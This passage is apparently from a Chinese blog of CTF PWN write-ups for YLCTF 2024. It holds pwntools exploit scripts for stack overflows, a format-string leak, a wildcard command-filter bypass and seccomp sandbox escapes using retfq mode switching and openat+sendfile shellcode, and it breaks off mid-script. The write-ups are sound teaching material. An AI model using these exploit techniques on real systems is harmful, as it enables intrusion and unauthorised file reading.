src="https://c-lby.top/images/2024YLCTF-1/%E6%89%A7%E8%A1%8C%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%97%B6%E6%9F%A5%E7%9C%8B%E5%81%8F%E7%A7%BB.png" alt="执行加载器时查看偏移"></p><p>此时rsi是0x*54，但是执行完syscall之后，rip会在0x*84（syscall占两个字节），能算出他们之间的偏移是0x30。所以传入下一段shellcode的时候要在payload前面加上一段0x30的padding。</p><h5 id="retfq"><a href="#retfq" class="headerlink" title="retfq"></a>retfq</h5><p>上面提到我们需要转架构成32位后执行open函数，具体来说我们需要借助<code>retf</code>这个汇编指令。网上有详细的介绍，但是我也是第一次遇到实际题目，所以还是写一下。<code>retf</code>这个指令等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br></pre></td></tr></table></figure><p>ip寄存器都很熟悉了，存放的时候retf结束后开始执行代码的地址。但是x86架构下的cs寄存器和8086里的用处已经不一样了。x86开始，cpu支持访问4G内存，CS寄存器作为代码段寄存器的意义已经不大了，在8086完成了它的使命之后，它被赋予了新的功能。对于retf这个指令来说，他可以控制我们需要切换的架构。cs为0x23的时候执行retf可以进入到32位模式，此时寄存器只有低32位可以使用，栈地址等也只能访问到32位地址。这也就是为什么我们需要一段32位地址的可执行内存来存放shellcode。cs为0x33的时候可以回到64位模式。</p><p>顺带一提，在8086中retf指令只是拿来转移cs段用的指令而已。</p><p>我们的间接可控地址现在在rsi寄存器里，别忘了这时候还是指向0x*54。所以我们需要将rsi加上一个值，让程序可以执行到后面的shellcode。这里我选择加0x3f，同时我在写payload的时候也会在这一段shellcode后面加上一些nop，这样就算我rsi跳到很后面了，我的代码也不会因执行不了而报错。因此，转架构可以写这样的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc_to86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop /*可去除*/</span></span><br><span class="line"><span class="string">add rsi, 0x3f</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">sc += asm(sc_to86, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里用的不是retf而是retfq，其中q只是限定了字大小而已，64位下采用retfq，32位下还是用retf。顺带一提，加上的那个0x3f并不能乱取，其中的0x30是为了跳过前面那些padding，剩下的0xf至少要保证能够跳过sc_to86这一段code。也就是说这个0xf可以更大，但是不能小到这段code都跳不过。ljust中的0x40要保证大于等于code中的0x3f。然后接下来就是写一段32位的open调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sc_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add esi,0x1b0</span></span><br><span class="line"><span class="string">mov esp, esi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_open, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br></pre></td></tr></table></figure><p>open在32位下的系统调用号是5。这里给esi又加上了一些偏移赋给了esp，这里是给系统调用开辟栈空间，一样是使用mmap的内存，一存多用。注意32的传参寄存器和64位不一样。</p><h4 id="写一段64位的rw系统调用"><a href="#写一段64位的rw系统调用" class="headerlink" title="写一段64位的rw系统调用"></a>写一段64位的rw系统调用</h4><p>首先需要先转换回64位，因为沙盒只开放了64位的read和write供我们使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sc_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub esi, 0x1b0</span></span><br><span class="line"><span class="string">add esi, 0x28</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push esi</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_to64, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里把之前当栈地址使用的esi寄存器还原，并加上一点偏移给到IP寄存器。这里同理，这里的0x28至少要保证跳过sc_open+sc_to64两段code。然后加一些nop来作为padding。下面就正常写rw的shellcode即可，这里我们需要一个地方来存放我们的flag，只要将rsi寄存器加上一点偏移就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sc_rw = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add rsi, 0x50</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc += asm(sc_rw, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后把sc发上去就能顺利打印出flag了。到此为止，这道题就结束了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bot_pb2 <span class="keyword">as</span> pb</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 0x96</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sc_to86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">add rsi, 0x3f</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add esi,0x1b0</span></span><br><span class="line"><span class="string">mov esp, esi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub esi, 0x1b0</span></span><br><span class="line"><span class="string">add esi, 0x28</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push esi</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sc_rw = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add rsi, 0x50</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x60</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(sc1, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">sc += asm(sc_to86, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">sc += asm(sc_open, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc += asm(sc_to64, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">sc += asm(sc_rw, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./msg_bot&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;challenge.yuanloo.com&quot;, 41741)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;botmsg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = pb.msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = AE64().encode(shellcode, strategy=<span class="string">&#x27;small&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg.SerializeToString()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.send(msg.SerializeToString())</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>WP看着短，实际因为本人平时shellcode练习太少，这道题花了差不多一天才浑浑噩噩地做出来。我也不知道哪里来的毅力和意志，能为了一道题花了几乎一整个白天肝了出来。从一开始毫无思路、工具调不对、思路错误、因为没有mmap调用而红温、数据包长度不对、shellcode执行报错、这样那样的各种问题，到能坚持到打通拿到flag，真是觉得不可思议（而且此时其他题并还没有ak，只是看到了protobuf就来做做了）。不过确实算是一个很宝贵的经验，学到了很多之前没接触过的shellcode思路和绕过方法，也告诉了我自己的薄弱点在哪里。一开始不理解为什么前9个大佬为什么能这么快就做出来，做出来才发现其实不难，重要的是经验，真到大型赛事的时候，不可能有这么多时间给我来像这样一点点推演的。</p><p>还得练</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> protobuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『YLCTF 源鲁杯 2024』 PWN-1 WP</title>
      <link href="/2024/2024YLCTF-1/"/>
      <url>/2024/2024YLCTF-1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-giaopwn"><a href="#0x00-giaopwn" class="headerlink" title="0x00 giaopwn"></a>0x00 giaopwn</h2><p>ret2text，没什么好讲的。有个cat flag的字符串，直接用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41537</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400743</span></span><br><span class="line">flag = <span class="number">0x601048</span></span><br><span class="line">system = <span class="number">0x4006D2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(flag)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x01-ezstack"><a href="#0x01-ezstack" class="headerlink" title="0x01 ezstack"></a>0x01 ezstack</h2><p>栈溢出+rce字符过滤。这道题的做法挺多的。过滤了c、f、s、h，且只能写十个字节。Linux万物皆文件，是文件就能用通配符进行模糊匹配。比如flag可以写成*lag。那cat咋办呢，cat命令本身指向&#x2F;bin&#x2F;cat这个文件，那么一样可以用&#x2F;bin&#x2F;*at来匹配。cat是个命令，所以直接*at是不行的。</p><p>还要注意一下栈平衡的问题。另外就是这里只能写十个字节，写完<code>/bin/\*at </code>就只剩一个位置写*了，所以会把当前目录下所有东西都打印出来，flag也包括在里面，得找一找。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">48489</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ezstack&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">vuln = <span class="number">0x401275</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(ret)+p64(vuln)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your command\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;/bin/?at *&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>另外我的学弟Garhin师傅利用<code>$0</code>直接getshell了，tql。然后想到<code>/bin/ba??</code>这样的形式应该也是能getshell的，所以这道题解法应该有很多。</p><h2 id="0x02-ez-fmt"><a href="#0x02-ez-fmt" class="headerlink" title="0x02  ez_fmt"></a>0x02  ez_fmt</h2><p>栈上fmt+栈溢出。泄露libc之后直接溢出到ogg就行了，不用劫持got表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">21821</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./pwn&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011DD</span></span><br><span class="line">vuln = <span class="number">0x40120D</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;YLCTF\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;%13$p&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln))</span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;YLCTF\n&#x27;)</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;\x00&#x27;</span>+p64(ogg))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-ezorw"><a href="#0x03-ezorw" class="headerlink" title="0x03 ezorw"></a>0x03 ezorw</h2><p>沙箱shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000013  if (A == readv) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000024f  if (A == 0x24f) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>禁用了普通的orw，那就用openat+sendfile的方案。零拷贝是真的好用，要是不强制使用read和write，现在基本都用sendfile。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">34957</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./ezorw&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(sc)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;orw~&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x04-canary-orw"><a href="#0x04-canary-orw" class="headerlink" title="0x04 canary_orw"></a>0x04 canary_orw</h2><p>gadget+shellcode。不知道我是不是把题目非预期了，给了个vuln函数是一点没用上。程序一来就直接可以往main的返回地址写东西，允许写最大21个字节。给了个canary形同虚设，NX也没开，所以直接往栈上写shellcode就完事了。</p><p>先利用jmp rsp执行一个read函数，因为字节数不够写，所以先不改rdx，还是写21字节，然后把一个可以读取更多字节数的read的shellcode写进去，再把orw的shellcode写进去就行。注意rsp会往下推，每次shellcode前面都要加上一定的padding就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./canary&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">38925</span>)</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x400820</span></span><br><span class="line">jmp_rsp = <span class="number">0x40081B</span></span><br><span class="line"></span><br><span class="line">payload = p64(jmp_rsp) + \</span><br><span class="line">    asm(<span class="string">&quot;xor eax, eax; mov rsi,rsp; mov edi,0; syscall&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+asm(<span class="string">&quot;xor eax,eax;mov edx,0x100;syscall&quot;</span>))</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    push SYS_open</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* read size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov 